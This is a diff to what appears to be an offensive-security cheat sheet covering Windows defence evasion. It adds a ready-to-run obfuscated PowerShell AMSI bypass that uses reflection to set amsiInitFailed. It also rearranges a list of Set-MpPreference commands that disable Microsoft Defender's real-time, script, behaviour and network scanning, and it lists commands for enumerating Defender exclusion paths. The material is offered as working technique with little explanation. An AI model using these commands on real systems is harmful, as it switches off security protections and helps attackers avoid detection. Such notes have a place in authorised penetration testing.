@@ -80,24 +80,26 @@ Get-ModifiableService -Verbose
 ## **Bypass AV / Defender / Applocker / Enhanced Script Block Logging**
 
 **AMSI Bypass**\
-****amsi.fail
+****S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ( TYpE ) ; ( Get-varI`A`BLE ( ('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
+
+
+
+amsi.fail
 
 **Disable AV Protection/Monitoring**
 
-{% code overflow="wrap" %}
-```powershell
-Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
-Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue 
+<pre class="language-powershell" data-overflow="wrap"><code class="lang-powershell">Set-MpPreference -DisableRealtimeMonitoring 1 -ErrorAction SilentlyContinue
+<strong>Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
+</strong>Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableBehaviorMonitoring 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableIntrusionPreventionSystem 1 -ErrorAction SilentlyContinue 
-Set-MpPreference -DisableIOAVProtection 1 -ErrorAction SilentlyContinue 
+
 Set-MpPreference -DisableRemovableDriveScanning 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableBlockAtFirstSeen 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan 1 -ErrorAction SilentlyContinue 
+Set-MpPreference -DisableArchiveScanning 1 -ErrorAction SilentlyContinue 
 Set-MpPreference -DisableScanningNetworkFiles 1 -ErrorAction SilentlyContinue 
-Set-MpPreference -DisableScriptScanning 1 -ErrorAction SilentlyContinue
-```
-{% endcode %}
+</code></pre>
 
 Kill defender:\
 [https://bidouillesecurity.com/disable-windows-defender-in-powershell/](https://bidouillesecurity.com/disable-windows-defender-in-powershell/)\
@@ -116,7 +118,7 @@ $ExecutionContext.SessionState.LanguageMode
 {% code overflow="wrap" %}
 ```powershell
 Get-MpPreference | Select-Object -Property ExclusionPath -ExpandProperty ExclusionPath
-Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths'
+Get-ChildItem -Path 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\'
 
 gpresult /h gp.html  => search in there?
 ```
